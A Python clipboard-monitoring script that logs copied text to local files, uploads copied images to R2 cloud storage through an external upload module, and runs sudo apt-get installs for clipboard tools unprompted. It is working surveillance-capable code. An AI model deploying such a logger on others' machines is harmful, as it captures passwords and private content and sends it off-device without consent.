import subprocess
import threading
import time
import logging
import os
import datetime
import sys
import tempfile
import io
import hashlib

# --- Logging Setup (Embedded) ---
UNIFIED_LOG_FILE = "thing.txt"
CONSOLE_LOG_FILE = "console.log"

class CustomFormatter(logging.Formatter):
    def formatTime(self, record, datefmt=None):
        ct = datetime.datetime.fromtimestamp(record.created)
        if datefmt:
            s = ct.strftime(datefmt)
        else:
            s = ct.strftime("%Y-%m-%d %H:%M:%S")
        return f"{s}.{int(record.msecs):02d}"

def setup_logging(script_name):
    # Ensure handlers are not duplicated if called multiple times in same process
    for handler in logging.root.handlers[:]:
        logging.root.removeHandler(handler)

    unified_handler = logging.FileHandler(UNIFIED_LOG_FILE, encoding="utf-8")
    unified_handler.setFormatter(CustomFormatter(fmt='%(asctime)s - %(levelname)s - %(message)s'))
    unified_handler.setLevel(logging.INFO)

    console_handler = logging.FileHandler(CONSOLE_LOG_FILE, encoding="utf-8")
    console_handler.setFormatter(CustomFormatter(fmt=f'%(asctime)s - {script_name} - %(levelname)s - %(message)s'))
    console_handler.setLevel(logging.DEBUG)

    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setFormatter(CustomFormatter(fmt=f'%(asctime)s - {script_name} - %(levelname)s - %(message)s'))
    stream_handler.setLevel(logging.INFO)

    logging.basicConfig(
        level=logging.DEBUG,
        handlers=[unified_handler, console_handler, stream_handler]
    )
# --- End of Logging Setup ---

setup_logging("CLIPBOARD_MONITOR")
log_write_lock = threading.Lock()

# Platform detection
IS_WINDOWS = sys.platform == 'win32'
IS_LINUX = sys.platform.startswith('linux')

# --- Attempt Imports with Error Handling ---
HAS_CLIPBOARD_MONITOR = False
if IS_LINUX: # clipboard-monitor is Linux-specific
    try:
        import clipboard_monitor # The external library
        HAS_CLIPBOARD_MONITOR = True
        logging.debug("CLIPBOARD: Successfully imported 'clipboard_monitor' library.")
    except ImportError as e:
        logging.warning(f"CLIPBOARD: Failed to import 'clipboard_monitor' library ({e}). Event-driven clipboard monitoring will be disabled.", exc_info=True)
else:
    logging.debug("CLIPBOARD: Running on non-Linux OS. 'clipboard_monitor' library will not be used.")

HAS_PIL = False
try:
    from PIL import Image, ImageGrab
    HAS_PIL = True
    logging.debug("CLIPBOARD: Successfully imported 'Pillow' (PIL).")
except ImportError as e:
    logging.warning(f"CLIPBOARD: Failed to import 'Pillow' (PIL) library ({e}). Image clipboard saving/uploading will be disabled.", exc_info=True)

HAS_PYPERCLIP = False
try:
    import pyperclip
    HAS_PYPERCLIP = True
    logging.debug("CLIPBOARD: Successfully imported 'pyperclip'.")
except ImportError as e:
    logging.warning(f"CLIPBOARD: Failed to import 'pyperclip' library ({e}). Initial clipboard content and general fallback may be limited.", exc_info=True)

HAS_UPLOAD_PY = False
try:
    import upload # Assuming upload.py is in the same directory
    if hasattr(upload, 'upload_to_r2') and callable(upload.upload_to_r2):
        HAS_UPLOAD_PY = True
        logging.debug("CLIPBOARD: Successfully imported 'upload.py' and found 'upload_to_r2'.")
    else:
        logging.warning(f"CLIPBOARD: 'upload.py' found, but 'upload_to_r2' function not found or not callable within it. Image upload disabled.", exc_info=True)
except ImportError as e:
    logging.warning(f"CLIPBOARD: Failed to import 'upload.py' ({e}). Image upload functionality will be disabled.", exc_info=True)
except Exception as e:
    logging.error(f"CLIPBOARD: An unexpected error occurred while importing 'upload.py': {e}", exc_info=True)

HAS_WL_PASTE = False
HAS_XCLIP = False

# --- Configuration ---
POLLING_INTERVAL_SECONDS = 0.5

# --- Global Variables ---
last_clipboard_content_polled = ""
last_clipboard_image_hash = None

# --- Helper to execute shell commands ---
def run_command(command, check_success=True, capture_output=True): # Added capture_output arg
    """
    Executes a shell command and returns its stdout.
    Handles various errors without crashing, logging them to console.log.
    Only attempts on Linux.
    """
    if not IS_LINUX:
        logging.debug(f"COMMAND_ERROR: Skipping Linux command '{command}' on non-Linux OS.")
        return None
    try:
        result = subprocess.run(command, capture_output=capture_output, text=True, check=check_success, shell=True, timeout=10) # Increased timeout
        return result.stdout.strip() if capture_output else True
    except subprocess.CalledProcessError as e:
        logging.debug(f"COMMAND_ERROR: Command '{command}' failed (exit code {e.returncode}). Stderr: {e.stderr.strip()}", exc_info=True)
        return None
    except FileNotFoundError:
        logging.debug(f"COMMAND_ERROR: Command '{command.split(' ')[0]}' not found.", exc_info=True)
        return None
    except subprocess.TimeoutExpired:
        logging.debug(f"COMMAND_ERROR: Command '{command}' timed out.", exc_info=True)
        return None
    except Exception as e:
        logging.debug(f"COMMAND_ERROR: Unexpected error running command '{command}': {e}", exc_info=True)
        return None

# --- NEW: Function to install Linux CLI tools ---
def install_linux_cli_tools():
    """
    Checks for and attempts to install necessary Linux command-line tools.
    Requires script to be run with root/sudo privileges to succeed.
    """
    global HAS_WL_PASTE, HAS_XCLIP

    if not IS_LINUX:
        logging.debug("CLIPBOARD: Skipping Linux CLI tool installation on non-Linux OS.")
        return

    required_tools = {
        "wl-clipboard": "wl-clipboard",
        "xclip": "xclip",
        "xsel": "xsel"
    }
    
    # Check if apt-get is available
    if run_command("command -v apt-get", check_success=False) is None:
        logging.error("CLIPBOARD: 'apt-get' command not found. Cannot automatically install Linux CLI tools. Please install manually.")
        return

    logging.info("CLIPBOARD: Checking for required Linux CLI tools...")

    for tool_name, package_name in required_tools.items():
        if run_command(f"command -v {tool_name}", check_success=False) is None:
            logging.warning(f"CLIPBOARD: '{tool_name}' not found. Attempting to install '{package_name}'...")
            try:
                # Attempt installation using sudo apt-get install -y
                # The 'sudo' part requires the parent script to be run with admin/root privileges.
                # If not, this will fail with a permission error.
                install_cmd = f"sudo apt-get install -y {package_name}"
                logging.info(f"CLIPBOARD: Executing installation command: '{install_cmd}'")
                
                result = subprocess.run(install_cmd, capture_output=True, text=True, shell=True, timeout=60) # Longer timeout for install
                
                if result.returncode == 0:
                    logging.info(f"CLIPBOARD: Successfully installed '{package_name}'.")
                    # Re-check if the tool is now available
                    if tool_name == "wl-clipboard":
                        HAS_WL_PASTE = True
                    elif tool_name == "xclip" or tool_name == "xsel":
                        HAS_XCLIP = True
                else:
                    logging.error(f"CLIPBOARD: Failed to install '{package_name}'. Exit code: {result.returncode}. Stderr: {result.stderr.strip()}")
                    if "E: Could not open lock file" in result.stderr or "E: Unable to acquire the dpkg frontend lock" in result.stderr:
                        logging.error("CLIPBOARD: apt-get lock detected. Another installation or update might be running. Try again later.")
                    elif "sudo: a password is required" in result.stderr or "sudo: no tty present and no askpass program specified" in result.stderr:
                        logging.error("CLIPBOARD: Installation failed: Script does not have sudo privileges. Please run the main script with 'sudo' or install '{package_name}' manually.")
                    else:
                        logging.error(f"CLIPBOARD: Unknown error during installation of '{package_name}'.")
            except subprocess.TimeoutExpired:
                logging.error(f"CLIPBOARD: Installation of '{package_name}' timed out.")
            except Exception as e:
                logging.error(f"CLIPBOARD: Unexpected error during installation of '{package_name}': {e}", exc_info=True)
        else:
            logging.debug(f"CLIPBOARD: '{tool_name}' already installed.")
            # Ensure flags are set if tools are already present
            if tool_name == "wl-clipboard":
                HAS_WL_PASTE = True
            elif tool_name == "xclip" or tool_name == "xsel":
                HAS_XCLIP = True

# --- Helper for Image Hashing ---
def _get_image_hash(pil_image):
    """
    Calculates a SHA256 hash of a PIL Image object by saving it to an in-memory PNG.
    Returns None if image is invalid or an error occurs.
    """
    if not pil_image:
        return None
    try:
        img_byte_arr = io.BytesIO()
        pil_image.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        return hashlib.sha256(img_byte_arr).hexdigest()
    except Exception as e:
        with log_write_lock:
            logging.error(f"CLIPBOARD: Error hashing image: {e}", exc_info=True)
        return None

# --- Clipboard Monitoring Callbacks/Polling ---
def log_clipboard_event(prefix, content=None):
    with log_write_lock:
        if "Image Changed" in prefix:
            logging.info(f"CLIPBOARD: {prefix}")
        elif isinstance(content, list):
            logging.info(f"CLIPBOARD: {prefix} - {len(content)} Files:")
            for item in content:
                logging.info(f"  - {item}")
        elif isinstance(content, str):
            display_content = content[:100] + "..." if len(content) > 100 else content
            logging.info(f"CLIPBOARD: {prefix} - Text: '{display_content}'")
        else:
            logging.info(f"CLIPBOARD: {prefix} - Type: {type(content).__name__} (Content may not be directly loggable)")

def on_text_change_clipboard_monitor(text):
    log_clipboard_event("Event-Driven Text Changed", text)

def on_files_change_clipboard_monitor(files):
    log_clipboard_event("Event-Driven Files Changed", files)

def on_image_change_clipboard_monitor():
    """
    Callback for image changes detected by clipboard-monitor OR by polling.
    Saves image to a temporary file, uploads it, and then deletes the temporary file.
    """
    current_time_str = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    log_clipboard_event(f"Image Changed at {current_time_str}")

    if not HAS_PIL:
        with log_write_lock:
            logging.info("CLIPBOARD: Image change detected, but Pillow library not available for processing.")
        return

    temp_file_path = None
    try:
        image = ImageGrab.grabclipboard()
        if image:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as temp_file:
                temp_file_path = temp_file.name
            image.save(temp_file_path)
            
            with log_write_lock:
                logging.info(f"CLIPBOARD: Image temporarily saved to {os.path.basename(temp_file_path)} for upload.")

            if HAS_UPLOAD_PY:
                upload_success = upload.upload_to_r2(temp_file_path)
                if upload_success:
                    with log_write_lock:
                        logging.info(f"CLIPBOARD: Image {os.path.basename(temp_file_path)} successfully uploaded to R2.")
                else:
                    with log_write_lock:
                        logging.warning(f"CLIPBOARD: Image {os.path.basename(temp_file_path)} upload to R2 failed.")
            else:
                with log_write_lock:
                    logging.warning("CLIPBOARD: 'upload.py' not available or 'upload_to_r2' function missing. Image not uploaded.")

        else:
            with log_write_lock:
                logging.info("CLIPBOARD: No image data found on clipboard or image format not supported by Pillow.")
    except Exception as e:
        with log_write_lock:
            logging.error(f"CLIPBOARD: Error processing/uploading image from clipboard: {e}", exc_info=True)
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
                with log_write_lock:
                    logging.debug(f"CLIPBOARD: Temporary image file {os.path.basename(temp_file_path)} deleted.")
            except Exception as e:
                with log_write_lock:
                    logging.error(f"CLIPBOARD: Error deleting temporary image file {os.path.basename(temp_file_path)}: {e}", exc_info=True)

def get_current_clipboard_content():
    """
    Tries to get the current clipboard text content using available methods.
    Prioritizes pyperclip (cross-platform), then Linux CLI tools.
    """
    if HAS_PYPERCLIP:
        try:
            content = pyperclip.paste()
            logging.debug("CLIPBOARD: Got text via pyperclip.")
            return content
        except Exception as e:
            logging.debug(f"CLIPBOARD: pyperclip.paste() failed: {e}", exc_info=True)

    if IS_LINUX: # Only try Linux CLI tools on Linux
        if HAS_WL_PASTE:
            content = run_command("wl-paste -n", check_success=False)
            if content is not None:
                logging.debug("CLIPBOARD: Got text via wl-paste.")
                return content

        if HAS_XCLIP:
            content = run_command("xclip -o -selection clipboard", check_success=False)
            if content is not None:
                logging.debug("CLIPBOARD: Got text via xclip.")
                return content

    logging.debug("CLIPBOARD: No reliable text clipboard tool/method found or all failed to get content.")
    return None

def poll_clipboard_content_loop():
    """
    Main loop for polling clipboard content (text and images).
    This loop will be the primary mechanism on Windows and a fallback on Linux.
    """
    global last_clipboard_content_polled, last_clipboard_image_hash
    while True:
        try:
            # --- Poll for Text Changes ---
            current_clipboard_text = get_current_clipboard_content()
            if current_clipboard_text is not None and current_clipboard_text != last_clipboard_content_polled:
                log_clipboard_event("Polled Text Change", current_clipboard_text)
                last_clipboard_content_polled = current_clipboard_text
                # If text changed, reset image hash (new clipboard content usually means new overall content)
                last_clipboard_image_hash = None
            
            # --- Poll for Image Changes (only if Pillow is available) ---
            if HAS_PIL:
                current_clipboard_image = None
                try:
                    current_clipboard_image = ImageGrab.grabclipboard()
                except Exception as e:
                    with log_write_lock:
                        # Log as debug to avoid excessive noise if it's just non-image data
                        logging.debug(f"CLIPBOARD_POLL_ERROR: ImageGrab.grabclipboard() failed during polling: {e}", exc_info=True)
                
                if current_clipboard_image:
                    current_image_hash = _get_image_hash(current_clipboard_image)
                    if current_image_hash and current_image_hash != last_clipboard_image_hash:
                        with log_write_lock:
                            logging.info("CLIPBOARD: Polled Image Change Detected.")
                        on_image_change_clipboard_monitor() # Call the image processing/upload function
                        last_clipboard_image_hash = current_image_hash
                elif last_clipboard_image_hash is not None: # If there was an image, but now there isn't
                    with log_write_lock:
                        logging.debug("CLIPBOARD: Polled image content is now empty/unrecognized.")
                    last_clipboard_image_hash = None # Reset hash

        except Exception as e:
            with log_write_lock:
                logging.error(f"CLIPBOARD_POLL_ERROR: Unhandled error in polling loop iteration: {e}", exc_info=True)
        time.sleep(POLLING_INTERVAL_SECONDS)

# --- Main Execution Block ---
if __name__ == "__main__":
    logging.info("--- Starting Clipboard Monitor ---")
    logging.info(f"Main activity log: {os.path.abspath(UNIFIED_LOG_FILE)}")
    logging.info(f"Error/Debug log: {os.path.abspath(CONSOLE_LOG_FILE)}")
    logging.info("Press Ctrl+C to stop.")

    if IS_WINDOWS:
        logging.info("CLIPBOARD: Running on Windows. Polling will be the primary clipboard monitoring method.")
    elif IS_LINUX:
        logging.info("CLIPBOARD: Running on Linux. Will attempt event-driven monitoring first, then fallback to polling.")
        # --- NEW: Attempt to install Linux CLI tools ---
        install_linux_cli_tools()
        # --- End NEW ---
    else:
        logging.warning(f"CLIPBOARD: Running on unsupported OS: {sys.platform}. Clipboard monitoring may not work as expected.")

    # Log initial clipboard content (text and image if present)
    initial_clipboard_text = get_current_clipboard_content()
    if initial_clipboard_text is not None:
        log_clipboard_event("Initial Text Content", initial_clipboard_text)
        last_clipboard_content_polled = initial_clipboard_text
    else:
        logging.warning("CLIPBOARD: Could not get initial text clipboard content via any method available.")

    if HAS_PIL:
        initial_clipboard_image = None
        try:
            initial_clipboard_image = ImageGrab.grabclipboard()
        except Exception as e:
            logging.warning(f"CLIPBOARD: Failed to get initial image clipboard content: {e}", exc_info=True)

        if initial_clipboard_image:
            last_clipboard_image_hash = _get_image_hash(initial_clipboard_image)
            if last_clipboard_image_hash:
                log_clipboard_event("Initial Image Content", f"Hash: {last_clipboard_image_hash[:8]}...")
            else:
                logging.warning("CLIPBOARD: Initial image content found but could not be hashed.")
        else:
            logging.info("CLIPBOARD: No initial image content on clipboard.")

    monitoring_method_started = False
    # Only attempt event-driven clipboard_monitor if on Linux and it's available
    if IS_LINUX and HAS_CLIPBOARD_MONITOR:
        try:
            clipboard_monitor.on_text(on_text_change_clipboard_monitor)
            clipboard_monitor.on_files(on_files_change_clipboard_monitor)
            clipboard_monitor.on_image(on_image_change_clipboard_monitor)
            logging.info("CLIPBOARD: Attempting clipboard monitoring with 'clipboard_monitor' (event-driven).")
            monitoring_method_started = True
            clipboard_monitor.wait() # This is a blocking call
        except KeyboardInterrupt:
            logging.info("CLIPBOARD: KeyboardInterrupt detected during 'clipboard_monitor.wait()'.")
            raise
        except Exception as e:
            logging.error(f"CLIPBOARD: 'clipboard_monitor' failed during wait cycle ({e}). Falling back to polling.", exc_info=True)
            HAS_CLIPBOARD_MONITOR = False # Mark as failed so it's not re-attempted
            monitoring_method_started = False

    # Always start polling if event-driven didn't start (or on Windows where it's not available)
    if not monitoring_method_started:
        # Polling will be the primary method on Windows, and a fallback on Linux
        # Ensure at least one method (pyperclip, PIL, or Linux CLI tools) is available for polling
        if (HAS_PYPERCLIP or HAS_PIL or (IS_LINUX and (HAS_WL_PASTE or HAS_XCLIP))):
            logging.info("CLIPBOARD: Starting clipboard monitoring via polling.")
            try:
                poll_clipboard_content_loop()
            except KeyboardInterrupt:
                logging.info("CLIPBOARD: KeyboardInterrupt detected during polling loop.")
                pass
            except Exception as e:
                logging.critical(f"CLIPBOARD: A critical error occurred in clipboard polling loop: {e}", exc_info=True)
        else:
            logging.critical("CLIPBOARD: No working clipboard monitoring method found. Monitoring disabled.")

    logging.info("--- Clipboard Monitor Ended ---")